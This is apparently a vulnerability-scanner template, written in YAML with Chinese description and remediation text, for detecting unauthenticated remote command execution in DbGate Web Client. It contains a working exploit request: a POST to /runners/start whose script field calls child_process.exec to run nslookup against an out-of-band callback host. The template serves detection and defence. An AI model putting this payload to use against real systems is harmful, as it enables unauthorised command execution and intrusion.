id: dbgate-unauth-rce

info:
  name: DbGate Web Client - 未授权 - 远程命令执行漏洞
  author: h0j3n
  severity: critical
  description: |
    该模板用于检测 DbGate Web Client - 未授权 - 远程命令执行漏洞。该类漏洞通常允许攻击者通过可控参数、接口调用或危险功能在目标服务端执行命令或代码。模板主要向 `/runners/start` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
  impact: |
    - 攻击者可在目标服务权限下执行系统命令或应用代码，读取、修改业务数据并部署持久化后门。
    - 若服务运行在高权限账户或可访问内网资源，漏洞可能进一步导致主机失陷和横向移动。
  remediation: |
    - 升级受影响产品到厂商修复版本，或应用官方补丁/安全配置基线。
    - 限制相关管理接口、调试接口或危险功能的访问来源，避免直接暴露到公网。
    - 排查异常进程、计划任务、WebShell、新增账号和外联记录，并轮换可能泄露的密钥与凭据。
  reference:
    - https://github.com/dbgate/dbgate
    - https://dbgate.org/docs/env-variables.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78,CWE-94
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:1198579728
  tags: http,rce,oast,electron,dbgate,oss,vuln

http:
  - raw:
      - |
        POST /runners/start HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"script":"process.mainModule.require('child_process').exec('nslookup {{interactsh-url}}')"}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '\"runid\"')
          - contains(interactsh_protocol, "dns")
        condition: and
